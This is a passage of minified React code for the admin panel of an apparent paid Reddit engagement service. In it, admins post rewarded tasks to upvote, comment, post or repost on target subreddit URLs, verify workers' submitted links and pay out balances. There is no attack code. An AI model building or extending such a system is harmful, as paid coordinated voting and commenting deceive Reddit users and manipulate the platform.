details.":f==="Withdrawals"?"View historical payout data and completed transactions.":f==="Reports"?"Review problems reported by users.":"Review and approve user submissions."})]}),n.jsxs("div",{className:"flex flex-wrap bg-white/[0.03] border border-white/5 p-1 rounded-2xl mb-8 sm:mb-12 w-full sm:w-fit gap-1",children:[n.jsx("button",{onClick:()=>w("Tasks"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${f==="Tasks"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Create"}),n.jsxs("button",{onClick:()=>w("Verification"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all relative ${f==="Verification"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:["Verify",a.filter(d=>d.status==="submitted").length>0&&n.jsx("span",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full text-[8px] flex items-center justify-center animate-pulse",children:a.filter(d=>d.status==="submitted").length})]}),n.jsx("button",{onClick:()=>w("Submissions"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${f==="Submissions"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"History"}),n.jsx("button",{onClick:()=>w("Users"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${f==="Users"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Users"}),n.jsx("button",{onClick:()=>w("Withdrawals"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${f==="Withdrawals"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Paid"}),n.jsxs("button",{onClick:()=>w("Reports"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all relative ${f==="Reports"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:["Reports",h.length>0&&n.jsx("span",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full text-[8px] flex items-center justify-center animate-pulse",children:h.length})]})]}),f==="Tasks"?n.jsxs(n.Fragment,{children:[n.jsxs("form",{onSubmit:xl,className:"space-y-6 sm:space-y-8",children:[n.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-8",children:[n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Mr,{size:14})," Task Tier"]}),n.jsxs("div",{className:"relative",ref:Gr,children:[n.jsxs("div",{onClick:()=>Kr(!Hr),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[n.jsx("span",{className:"text-white font-medium",children:Ne}),n.jsx(bt,{size:18,className:`text-gray-500 transition-transform ${Hr?"rotate-180":""}`})]}),Hr&&n.jsx("div",{className:"absolute top-full left-0 right-0 mt-2 p-2 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:["Tier 1","Tier 2","Tier 3"].map(d=>n.jsx("div",{onClick:()=>{F(d),Kr(!1)},className:`px-4 py-3 rounded-xl text-xs font-bold cursor-pointer transition-all mb-1 last:mb-0 ${Ne===d?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:d},d))})]})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Ui,{size:14})," Subreddit"]}),n.jsx("input",{type:"text",required:!0,placeholder:"e.g. MovingToLondon",value:ce,onChange:d=>ue(d.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Hm,{size:14})," Task Title"]}),n.jsx("input",{type:"text",required:!0,placeholder:"e.g. Upvote and Comment on r/tech",value:ze,onChange:d=>Ge(d.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Di,{size:14})," Category"]}),n.jsxs("div",{className:"relative",ref:Qr,children:[n.jsxs("div",{onClick:()=>Yr(!Jr),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[n.jsx("span",{className:"text-white font-bold uppercase tracking-tight",children:O}),n.jsx(bt,{size:18,className:`text-gray-500 transition-transform ${Jr?"rotate-180":""}`})]}),Jr&&n.jsx("div",{className:"absolute top-full left-0 right-0 mt-2 p-2 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:["COMMENT","POST","UPVOTE","REPLY TO COMMENT","REPOST"].map(d=>n.jsx("div",{onClick:()=>{X(d),Yr(!1)},className:`px-4 py-3 rounded-xl text-[10px] font-black cursor-pointer transition-all mb-1 last:mb-0 tracking-widest uppercase ${O===d?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:d},d))})]})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Er,{size:14})," Reward Amount"]}),n.jsxs("div",{className:"relative",children:[n.jsx("span",{className:"absolute left-5 top-1/2 -translate-y-1/2 text-gray-500 text-sm",children:"$"}),n.jsx("input",{type:"text",required:!0,placeholder:"0.50",value:Le,onChange:d=>Bt(d.target.value),className:"w-full pl-10 pr-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Ht,{size:14})," Deadline"]}),n.jsxs("div",{className:"relative",ref:Zr,children:[n.jsxs("div",{onClick:()=>vn(!Xr),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[n.jsx("span",{className:Y?"text-white font-medium":"text-gray-600",children:Y?new Date(Y).toLocaleString([],{dateStyle:"medium",timeStyle:"short"}):"Select date and time"}),n.jsx(Ht,{size:18,className:`text-gray-500 group-hover:text-blue-500 transition-colors ${Xr?"text-blue-500":""}`})]}),Xr&&n.jsxs("div",{className:"absolute top-full left-0 right-0 sm:right-auto sm:w-80 mt-2 p-4 bg-[#0a0a0a] border border-white/10 rounded-3xl shadow-2xl z-[60] animate-in fade-in slide-in-from-top-2 duration-200",children:[n.jsxs("div",{className:"flex items-center justify-between mb-4 px-1",children:[n.jsx("button",{type:"button",onClick:()=>wn(new Date(le.getFullYear(),le.getMonth()-1)),className:"p-1.5 hover:bg-white/5 rounded-lg text-gray-400 transition-colors",children:n.jsx(bt,{size:18,className:"rotate-90"})}),n.jsx("span",{className:"text-xs font-black uppercase italic tracking-widest text-blue-500",children:new Intl.DateTimeFormat("en-US",{month:"long",year:"numeric"}).format(le)}),n.jsx("button",{type:"button",onClick:()=>wn(new Date(le.getFullYear(),le.getMonth()+1)),className:"p-1.5 hover:bg-white/5 rounded-lg text-gray-400 transition-colors",children:n.jsx(bt,{size:18,className:"-rotate-90"})})]}),n.jsxs("div",{className:"grid grid-cols-7 gap-1 mb-2",children:[["S","M","T","W","T","F","S"].map(d=>n.jsx("div",{className:"text-[10px] font-black text-gray-600 text-center py-1 uppercase",children:d},d)),Array.from({length:new Date(le.getFullYear(),le.getMonth(),1).getDay()}).map((d,N)=>n.jsx("div",{},`empty-${N}`)),Array.from({length:new Date(le.getFullYear(),le.getMonth()+1,0).getDate()}).map((d,N)=>{const E=N+1,P=Y&&new Date(Y).getDate()===E&&new Date(Y).getMonth()===le.getMonth()&&new Date(Y).getFullYear()===le.getFullYear();return n.jsx("div",{onClick:()=>{const _=new Date(le.getFullYear(),le.getMonth(),E),Z=Y?new Date(Y):new Date;_.setHours(Z.getHours()),_.setMinutes(Z.getMinutes());const Re=Tt=>Tt.toString().padStart(2,"0");Et(`${_.getFullYear()}-${Re(_.getMonth()+1)}-${Re(_.getDate())}T${Re(_.getHours())}:${Re(_.getMinutes())}`)},className:`aspect-square flex items-center justify-center text-[11px] font-bold rounded-lg cursor-pointer transition-all ${P?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:E},E)})]}),n.jsxs("div",{className:"mt-4 pt-4 border-t border-white/5 flex items-center justify-between gap-4",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(Ht,{size:14,className:"text-gray-500"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-wider",children:"Time"})]}),n.jsxs("div",{className:"flex items-center gap-1",children:[n.jsx("input",{type:"number",min:"0",max:"23",value:Y?new Date(Y).getHours():12,onChange:d=>{const N=Math.max(0,Math.min(23,parseInt(d.target.value)||0)),E=Y?new Date(Y):new Date;E.setHours(N);const P=_=>_.toString().padStart(2,"0");Et(`${E.getFullYear()}-${P(E.getMonth()+1)}-${P(E.getDate())}T${P(E.getHours())}:${P(E.getMinutes())}`)},className:"w-10 py-1 bg-white/5 border border-white/5 rounded-md text-center text-xs font-bold focus:border-blue-500 outline-none"}),n.jsx("span",{className:"text-gray-600 font-bold",children:":"}),n.jsx("input",{type:"number",min:"0",max:"59",value:Y?new Date(Y).getMinutes():0,onChange:d=>{const N=Math.max(0,Math.min(59,parseInt(d.target.value)||0)),E=Y?new Date(Y):new Date;E.setMinutes(N);const P=_=>_.toString().padStart(2,"0");Et(`${E.getFullYear()}-${P(E.getMonth()+1)}-${P(E.getDate())}T${P(E.getHours())}:${P(E.getMinutes())}`)},className:"w-10 py-1 bg-white/5 border border-white/5 rounded-md text-center text-xs font-bold focus:border-blue-500 outline-none"})]})]})]})]})]})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Ui,{size:14})," Target Reddit URL"]}),n.jsx("input",{type:"url",required:!0,placeholder:"https://www.reddit.com/r/...",value:gn,onChange:d=>Vr(d.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(lr,{size:14})," Assign to User"]}),n.jsxs("div",{className:"relative",ref:ts,children:[n.jsxs("div",{onClick:()=>Yt(!es),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[n.jsx("span",{className:Je==="All"?"text-gray-500":"text-white font-medium",children:Sl}),n.jsx(bt,{size:18,className:`text-gray-500 transition-transform ${es?"rotate-180":""}`})]}),es&&n.jsxs("div",{className:"absolute top-full left-0 right-0 mt-2 p-3 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:[n.jsxs("div",{className:"relative mb-3",children:[n.jsx(ku,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500",size:14}),n.jsx("input",{type:"text",placeholder:"Search server or reddit name...",value:Ct,onChange:d=>bn(d.target.value),autoFocus:!0,className:"w-full pl-10 pr-4 py-2.5 bg-white/[0.05] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-xs"})]}),n.jsxs("div",{className:"max-h-60 overflow-y-auto space-y-1 custom-scrollbar",children:[n.jsx("div",{onClick:()=>{Jt("All"),Yt(!1)},className:`px-4 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all ${Je==="All"?"bg-blue-600 text-white":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:"Everyone (Public)"}),_n.map(d=>n.jsxs("div",{onClick:()=>{Jt(d.email),Yt(!1)},className:`px-4 py-2.5 rounded-xl text-xs cursor-pointer transition-all ${Je===d.email?"bg-blue-600 text-white font-bold":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:[n.jsx("div",{className:"font-bold",children:d.server_username||d.email.split("@")[0]}),n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsxs("div",{className:"text-[10px] opacity-60",children:["u/",d.reddit_username||"not_connected"]}),d.reddit_karma!=null?n.jsxs("div",{className:"text-[10px] opacity-60 text-blue-400",children:[" ",d.reddit_karma.toLocaleString()," karma"]}):d.reddit_username&&d.reddit_username!=="not_connected"?n.jsx("div",{className:"text-[10px] opacity-40 text-blue-400 animate-pulse",children:" fetching karma..."}):null,d.discord_username&&n.jsxs("div",{className:"text-[10px] opacity-60 flex items-center gap-1",children:[n.jsx(Ut,{size:10})," ",d.discord_username]})]})]},d.email)),_n.length===0&&Ct!==""&&n.jsxs("div",{className:"py-8 text-center text-gray-600 text-xs italic",children:['No users found matching "',Ct,'"']})]})]})]}),n.jsx("p",{className:"text-[10px] text-gray-600 ml-1",children:"Select a specific user or keep it public."})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:"Instructions for Users"}),n.jsx("textarea",{rows:5,required:!0,placeholder:"Detail exactly what the user needs to do...",value:yn,onChange:d=>qr(d.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),n.jsxs("div",{className:"flex flex-col sm:flex-row gap-4 pt-6",children:[n.jsxs("button",{type:"button",onClick:jn,className:"w-full sm:w-auto px-8 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all flex items-center justify-center gap-2",children:[n.jsx(Lr,{size:18}),x?"Cancel Edit":"Reset Form"]}),n.jsxs("button",{type:"submit",className:"w-full sm:flex-1 py-4 bg-blue-600 text-white rounded-2xl font-bold text-sm hover:bg-blue-700 transition-all shadow-xl shadow-blue-600/20 flex items-center justify-center gap-2 group",children:[n.jsx(un,{size:18,className:"group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform"}),x?"Update Task":"Publish Task to Network"]})]})]}),n.jsxs("section",{className:"mt-20",children:[n.jsx("h2",{className:"text-xl font-bold mb-8",children:"Existing Tasks"}),n.jsx("div",{className:"space-y-4",children:a.filter(d=>d.status!=="verified").length>0?a.filter(d=>d.status!=="verified").map(d=>n.jsx("div",{className:`p-6 rounded-3xl border transition-all ${d.is_hidden?"bg-white/[0.01] border-white/5 opacity-50":"bg-white/[0.03] border-white/10"}`,children:n.jsxs("div",{className:"flex items-center justify-between gap-4",children:[n.jsxs("div",{className:"flex-1",children:[n.jsxs("div",{className:"flex items-center gap-3 mb-1",children:[n.jsx("span",{className:"text-xs font-black text-blue-500",children:d.task_id_display}),n.jsx("h3",{className:"font-bold",children:d.title}),n.jsx("span",{className:`text-[9px] uppercase font-black px-2 py-0.5 rounded ${d.tier==="Tier 3"?"bg-red-500/10 text-red-500":d.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:d.tier}),n.jsx("span",{className:"text-[10px] uppercase font-bold text-gray-500 bg-white/5 px-2 py-0.5 rounded",children:d.category}),n.jsx("span",{className:`text-[10px] font-bold px-2 py-0.5 rounded ${d.assigned_to==="All"?"text-emerald-500 bg-emerald-500/10":"text-orange-500 bg-orange-500/10"}`,children:d.assigned_to==="All"?"PUBLIC":`PRIVATE: ${d.assigned_to}`})]}),n.jsx("p",{className:"text-xs text-gray-500 truncate max-w-md",children:d.reddit_url})]}),n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("button",{onClick:()=>vl(d),className:"p-2 hover:bg-white/10 rounded-lg text-gray-400",title:d.is_hidden?"Show":"Hide",children:d.is_hidden?n.jsx(Bm,{size:18}):n.jsx(bu,{size:18})}),n.jsx("button",{onClick:()=>gl(d),className:"p-2 hover:bg-blue-600/20 rounded-lg text-blue-500",title:"Edit",children:n.jsx(ju,{size:18})}),n.jsx("button",{onClick:()=>yl(d.id),className:"p-2 hover:bg-red-600/20 rounded-lg text-red-500",title:"Delete",children:n.jsx(Lr,{size:18})})]})]})},d.id)):n.jsx("p",{className:"text-gray-500 text-center py-10",children:"No active tasks found in database."})})]})]}):f==="Verification"?n.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[n.jsx("h2",{className:"text-xl font-bold mb-8 italic uppercase tracking-tight",children:"Pending Submissions"}),a.filter(d=>d.status==="submitted").length>0?a.filter(d=>d.status==="submitted").map(d=>{var N,E,P;return n.jsx("div",{className:"bg-white/[0.02] border border-white/5 rounded-[32px] p-5 sm:p-8 hover:border-blue-500/20 transition-all",children:n.jsxs("div",{className:"flex flex-col md:flex-row justify-between gap-6",children:[n.jsxs("div",{className:"flex-1 space-y-4",children:[n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("span",{className:"text-[10px] font-black text-blue-500",children:d.task_id_display}),n.jsx("h3",{className:"font-bold text-white text-lg",children:d.title}),n.jsx("span",{className:"text-[9px] font-black bg-amber-500/10 text-amber-500 px-2 py-0.5 rounded uppercase",children:d.tier})]}),n.jsxs("div",{className:"flex flex-wrap gap-4 text-[11px] text-gray-500",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(lr,{size:14}),n.jsx("span",{className:"font-bold text-gray-300",children:d.claimed_by})]}),n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(Er,{size:14}),n.jsx("span",{className:"font-bold text-emerald-500",children:d.reward})]})]}),n.jsxs("div",{className:"space-y-3 pt-4",children:[n.jsxs("div",{className:"p-4 bg-black/40 rounded-2xl border border-white/5",children:[n.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-2",children:"Main Link"}),n.jsx("a",{href:(N=d.submission_data)==null?void 0:N.main_link,target:"_blank",rel:"noreferrer",className:"text-xs text-blue-500 hover:underline break-all",children:(E=d.submission_data)==null?void 0:E.main_link})]}),((P=d.submission_data)==null?void 0:P.random_comments)&&d.submission_data.random_comments.some(_=>_!=="")&&n.jsxs("div",{className:"p-4 bg-black/40 rounded-2xl border border-white/5",children:[n.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-2",children:"Random Comments"}),n.jsx("div",{className:"space-y-2",children:d.submission_data.random_comments.map((_,Z)=>_&&n.jsxs("a",{href:_,target:"_blank",rel:"noreferrer",className:"text-[10px] text-gray-400 hover:text-white block hover:underline truncate",children:[Z+1,". ",_]},Z))})]})]})]}),n.jsxs("div",{className:"flex flex-row md:flex-col gap-3 justify-end",children:[n.jsxs("button",{onClick:()=>wl(d),className:"flex-1 md:flex-none px-8 py-4 bg-emerald-600 text-white rounded-2xl font-black text-sm hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-600/20 flex items-center justify-center gap-2",children:[n.jsx(Fe,{size:18,strokeWidth:3}),"VERIFY"]}),n.jsxs("button",{onClick:()=>bl(d),className:"flex-1 md:flex-none px-8 py-4 bg-red-600 text-white rounded-2xl font-black text-sm hover:bg-red-700 transition-all shadow-lg shadow-red-600/20 flex items-center justify-center gap-2",children:[n.jsx(re,{size:18,strokeWidth:3}),"REJECT"]}),n.jsxs("button",{onClick:()=>kn(d.claimed_by),className:"flex-1 md:flex-none px-8 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/10 transition-all flex items-center justify-center gap-2",children:[n.jsx(Ut,{size:18}),"ALERT"]})]})]})},d.id)}):n.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[n.jsx(ir,{size:48,className:"mx-auto text-gray-700 mb-4"}),n.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"All caught up! No pending submissions."})]})]}):f==="Users"?n.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[n.jsxs("div",{className:"flex items-center justify-between mb-8",children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Registered Users"}),n.jsx("button",{onClick:()=>ss(!0),className:"p-2 hover:bg-white/5 rounded-xl text-gray-500 hover:text-blue-500 transition-all group",title:"Refresh Karma for everyone",children:n.jsx(Ht,{size:16,className:"group-hover:rotate-180 transition-transform duration-500"})})]}),n.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[n.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total: "}),n.jsx("span",{className:"text-sm font-black text-white",children:l.length})]})]}),l.length>0?n.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:l.map(d=>{const N=a.filter(_=>_.claimed_by===d.email&&(_.status==="verified"||_.status==="submitted")),E=oe===d.email,P=c.filter(_=>_.user_email===d.email&&_.status==="pending");return n.jsxs("div",{className:`bg-white/[0.02] border rounded-[28px] p-4 sm:p-6 transition-all ${P.length>0?"border-red-500/30":"border-white/5 hover:border-blue-500/20"}`,children:[n.jsxs("div",{className:"flex items-start gap-4 mb-4",children:[n.jsxs("div",{className:"relative",children:[n.jsx("div",{className:"w-12 h-12 bg-gradient-to-br from-blue-600 to-purple-600 rounded-2xl flex items-center justify-center text-white font-black text-lg flex-shrink-0",children:(d.server_username||d.email)[0].toUpperCase()}),P.length>0&&n.jsx("div",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 border-2 border-[#0a0a0a] rounded-full animate-pulse shadow-lg shadow-red-500/40"})]}),n.jsxs("div",{className:"flex-1 min-w-0",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("h3",{className:"font-bold text-white text-sm truncate",children:d.server_username||d.email.split("@")[0]}),P.length>0&&n.jsx("span",{className:"text-[8px] font-black bg-red-500/10 text-red-500 px-1.5 py-0.5 rounded uppercase tracking-tighter",children:"Withdrawal Req"})]}),n.jsx("p",{className:"text-[11px] text-gray-500 truncate",children:d.email}),d.reddit_username&&n.jsxs("div",{className:"flex items-center gap-2 mt-1",children:[n.jsxs("a",{href:`https://reddit.com/u/${d.reddit_username}`,target:"_blank",rel:"noreferrer",className:"text-[10px] text-orange-500 font-bold hover:underline flex items-center gap-1",children:["u/",d.reddit_username,n.jsx(pa,{size:10})]}),d.reddit_karma!=null?n.jsxs("span",{className:"text-[10px] text-blue-400 font-bold",children:[" ",d.reddit_karma.toLocaleString()," karma"]}):n.jsx("span",{className:"text-[10px] text-blue-400/40 font-bold animate-pulse",children:" fetching..."})]})]})]}),n.jsxs("div",{className:"grid grid-cols-1 gap-2 mb-4",children:[n.jsxs("div",{className:"flex items-center justify-between p-3 bg-emerald-500/5 border border-emerald-500/10 rounded-xl",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(dn,{size:14,className:"text-emerald-500"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Current Balance"})]}),n.jsxs("span",{className:"text-sm font-black text-emerald-500",children:["$",(d.balance||0).toFixed(2)]})]}),P.length>0&&n.jsx("div",{className:"space-y-2",children:P.map(_=>n.jsxs("div",{className:"p-3 bg-red-500/5 border border-red-500/10 rounded-xl",children:[n.jsxs("div",{className:"flex items-center justify-between mb-2",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(Er,{size:14,className:"text-red-500"}),n.jsxs("div",{className:"flex flex-col",children:[n.jsx("span",{className:"text-[10px] font-black text-red-500 uppercase",children:"Withdrawal Request"}),n.jsx("span",{className:"text-[9px] font-mono text-gray-500",children:_.transaction_id})]})]}),n.jsxs("span",{className:"text-sm font-black text-red-500",children:["$",_.amount.toFixed(2)]})]}),n.jsxs("div",{className:"flex items-center justify-between gap-3 px-2 py-1.5 bg-white/[0.03] rounded-lg",children:[n.jsxs("div",{className:"flex items-center gap-2 flex-1 min-w-0",children:[n.jsx("img",{src:Qa[_.payout_method.type],alt:_.payout_method.label,className:"w-3.5 h-3.5 object-contain"}),n.jsxs("div",{className:"flex flex-col min-w-0",children:[n.jsx("span",{className:"text-[9px] font-black text-gray-400 uppercase leading-none mb-0.5",children:_.payout_method.label}),n.jsx("span",{className:"text-[10px] font-bold text-gray-200 truncate",children:_.payout_method.value})]})]}),n.jsx("button",{onClick:()=>kl(_),className:"px-3 py-1 bg-emerald-600 hover:bg-emerald-700 text-white text-[9px] font-black rounded-lg transition-all shadow-lg shadow-emerald-600/10 whitespace-nowrap",children:"PAID"})]})]},_.id))})]}),n.jsxs("div",{className:"mb-4",children:[n.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[n.jsx(ol,{size:14,className:"text-gray-500"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Payout Methods"})]}),d.payout_methods&&d.payout_methods.length>0?n.jsx("div",{className:"flex flex-wrap gap-2",children:d.payout_methods.map(_=>n.jsxs("div",{className:"flex items-center gap-2 px-3 py-1.5 bg-white/[0.03] border border-white/5 rounded-xl",children:[n.jsx("img",{src:Qa[_.type],alt:_.label,className:"w-4 h-4 object-contain"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-300 truncate max-w-[100px]",children:_.value})]},_.id))}):n.jsx("p",{className:"text-[10px] text-gray-600 italic",children:"No payout methods"})]}),n.jsxs("div",{children:[n.jsxs("button",{onClick:()=>yt(E?null:d.email),className:"w-full flex items-center justify-between p-3 bg-white/[0.02] border border-white/5 rounded-xl hover:bg-white/[0.04] transition-all",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(ir,{size:14,className:"text-blue-500"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Completed Tasks"})]}),n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("span",{className:"text-xs font-black text-white",children:N.length}),n.jsx(bt,{size:14,className:`text-gray-500 transition-transform ${E?"rotate-180":""}`})]})]}),E&&N.length>0&&n.jsx("div",{className:"mt-2 p-3 bg-black/40 rounded-xl border border-white/5 space-y-2 max-h-48 overflow-y-auto",children:N.map(_=>{var Z;return n.jsxs("div",{className:"flex items-center justify-between gap-2 p-2 bg-white/[0.02] rounded-lg",children:[n.jsxs("div",{className:"flex-1 min-w-0",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("span",{className:"text-[9px] font-black text-blue-500",children:_.task_id_display}),n.jsx("span",{className:`text-[8px] font-black px-1.5 py-0.5 rounded uppercase ${_.status==="verified"?"bg-emerald-500/10 text-emerald-500":"bg-amber-500/10 text-amber-500"}`,children:_.status})]}),n.jsx("p",{className:"text-[10px] text-gray-300 truncate",children:_.title})]}),((Z=_.submission_data)==null?void 0:Z.main_link)&&n.jsx("a",{href:_.submission_data.main_link,target:"_blank",rel:"noreferrer",className:"p-1.5 text-gray-500 hover:text-blue-500 hover:bg-blue-500/10 rounded-lg transition-all flex-shrink-0",title:"View submission",children:n.jsx(pa,{size:12})})]},_.id)})}),E&&N.length===0&&n.jsx("div",{className:"mt-2 p-4 bg-black/40 rounded-xl border border-white/5 text-center",children:n.jsx("p",{className:"text-[10px] text-gray-600",children:"No tasks completed yet"})})]})]},d.email)})}):n.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[n.jsx(_u,{size:48,className:"mx-auto text-gray-700 mb-4"}),n.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No users registered yet."})]})]}):f==="Reports"?n.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[n.jsxs("div",{className:"flex items-center justify-between mb-8",children:[n.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"User Reported Issues"}),n.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[n.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Active: "}),n.jsx("span",{className:"text-sm font-black text-white",children:h.length})]})]}),n.jsx("div",{className:"space-y-4",children:h.length>0?h.map(d=>{var N,E,P;return n.jsx("div",{className:"bg-white/[0.02] border border-white/5 p-6 rounded-[32px] group hover:border-red-500/20 transition-all",children:n.jsxs("div",{className:"flex flex-col sm:flex-row justify-between items-start 